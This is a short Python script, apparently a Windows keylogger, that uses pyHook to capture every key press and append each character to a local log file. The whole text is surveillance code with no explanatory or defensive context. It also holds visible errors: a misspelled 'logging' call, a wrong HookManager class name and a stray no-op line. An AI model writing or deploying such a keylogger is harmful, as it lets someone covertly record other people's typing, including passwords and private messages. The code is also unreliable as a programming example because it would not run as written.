import pyHook, pythoncom, sys, logging

file_log = 'C:\\important\\log.txt'

def OnKeyboardEvent(event):
    loggin.basicConfig(filename=file_log, level = logging.DEBUG, format ='%(message)s' )
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.Hook.Manager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
